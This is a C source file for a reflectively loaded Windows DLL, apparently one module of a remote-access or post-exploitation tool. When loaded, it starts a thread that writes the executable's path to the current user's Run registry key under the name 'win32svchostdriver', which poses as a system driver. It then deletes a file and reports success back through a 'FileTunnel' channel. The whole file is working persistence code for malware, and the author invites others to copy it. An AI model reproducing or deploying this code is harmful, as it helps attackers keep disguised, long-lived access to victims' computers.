//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//

/*
Have a good time reading the source. You're an amazing person.
If you decide to copy, Don't forget to give me credit.
*/


#include "ReflectiveLoader.h"
#include "FileTunnel.h"

extern HINSTANCE hAppInstance;

// Get full path of application
// Add to startup
void StartupKey(const char* czExePath)
{
	DeleteFile("output.png");
	HKEY hKey;
    char szDir[MAX_PATH + 1]; 
	memset(szDir, '\0', MAX_PATH+1);
    GetFullPathName(czExePath, MAX_PATH + 1, szDir, NULL); 
	LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
								"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
								0 , KEY_WRITE,
								&hKey);
	if( ERROR_SUCCESS == lnRes )
	{   
		lnRes = RegSetValueEx(  hKey,
								"win32svchostdriver",
								0,
								REG_SZ,
								(unsigned char*)szDir,
								strlen(szDir));
	}

	RegCloseKey(hKey);
}
void run()
{
    StartupKey(GetInputOutput());
	WriteOutput("Added startup key.");
}

//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			CreateThread(NULL ,0, (LPTHREAD_START_ROUTINE)run, NULL, 0, NULL);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}